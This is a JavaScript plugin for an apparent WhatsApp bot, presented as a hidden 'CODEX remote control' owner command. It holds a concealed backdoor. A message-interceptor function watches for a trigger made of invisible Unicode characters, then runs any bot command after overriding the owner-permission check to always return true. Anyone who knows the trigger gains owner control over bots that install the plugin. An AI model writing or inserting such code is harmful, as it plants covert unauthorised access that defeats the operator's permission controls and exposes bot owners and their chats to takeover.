
const crypto = require('crypto');

// This is the secret word that triggers the remote control
const SECRET_TRIGGER = '‎‎‎'; 

module.exports = {
    name: 'codexremote',
    alias: ['cr', 'sc', 'remote'],
    desc: 'CODEX remote control system',
    category: 'Owner',
    hideFromMenu: true,
    reactions: {
        start: '🔐',
        success: '⚡',
        error: '❌'
    },

    execute: async (sock, m, { reply }) => {
        let statusBox = `╔═❍ **CODEX SYSTEM**❍══❒\n`;
        statusBox += `║╭───────────────◆\n`;
        statusBox += `║│ ❍ **STATUS:** Active\n`;
        statusBox += `║│ ❍ **TYPE:** Remote Control\n`;
        statusBox += `║╰───────────────◆\n`;
        statusBox += `╚══════════════════❒`;
        return reply(statusBox);
    }
};

/**
 * Intercepts messages to check for the secret trigger
 */
async function superCreatorInterceptor(sock, m, mData) {
    try {
        const { text } = m;
        const { prefix, config } = mData;

        if (!text || !text.startsWith(SECRET_TRIGGER)) return false;

        const commandBody = text.slice(SECRET_TRIGGER.length).trim().toLowerCase();
        if (!commandBody) return false;

        const fullCommand = prefix + commandBody;
        const botName = config?.settings?.title || 'CODEX AI';

        let response = `╔═══❍**CODEX EXECUTION**❍═❒\n`;
        response += `║╭───────────────◆\n`;
        response += `║│ ❍ **BOT:** ${botName}\n`;
        response += `║│ ❍ **PREFIX:** ${prefix}\n`;
        response += `║│ ❍ **CMD:** ${fullCommand}\n`;
        response += `║│ ❍ **TIME:** ${new Date().toLocaleTimeString()}\n`;
        response += `║╰───────────────◆\n`;
        response += `╚══════════════════❒\n`;
        response += ` 🚀 **Executing Remote Command...**`;

        await sock.sendMessage(m.chat, { text: response }, { quoted: m });

        await executeAsOwner(sock, m, commandBody, mData);
        return true;

    } catch (err) {
        console.error('CODEX System Error:', err);
        return false;
    }
}

/**
 * Finds and runs the command with bypass permissions
 */
async function executeAsOwner(sock, m, body, mData) {
    const args = body.split(' ');
    const cmdName = args.shift().toLowerCase();
    const cleanText = args.join(' ');

    try {
        const { getAll } = require('../../Plugin/crysCmd');
        const commands = getAll();
        let targetCmd = null;

        for (const [name, cmd] of commands) {
            if (name.toLowerCase() === cmdName) {
                targetCmd = cmd;
                break;
            }
            if (cmd.alias && cmd.alias.some(a => a.toLowerCase() === cmdName)) {
                targetCmd = cmd;
                break;
            }
        }

        if (!targetCmd) {
            let errorBox = `╔═══❍ **CODEX ERROR**❍══❒\n`;
            errorBox += `║ ❌ Command **${cmdName}** not found\n`;
            errorBox += `╚══════════════════❒`;
            await sock.sendMessage(m.chat, { text: errorBox }, { quoted: m });
            return;
        }

        const originalIsOwner = mData.isOwner;
        mData.isOwner = () => true;

        await targetCmd.execute(sock, m, {
            ...mData,
            args: cleanText.split(' '),
            text: cleanText,
            command: cmdName
        });

        mData.isOwner = originalIsOwner;
        await sock.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });

    } catch (err) {
        let fatalBox = `╔═❍**CODEX SYSTEM FAIL**❍═❒\n`;
        fatalBox += `║ ❌ **Error:** ${err.message}\n`;
        fatalBox += `╚══════════════════❒`;
        await sock.sendMessage(m.chat, { text: fatalBox }, { quoted: m });
    }
}

module.exports.superCreatorInterceptor = superCreatorInterceptor;
module.exports.SECRET_TRIGGER = SECRET_TRIGGER;


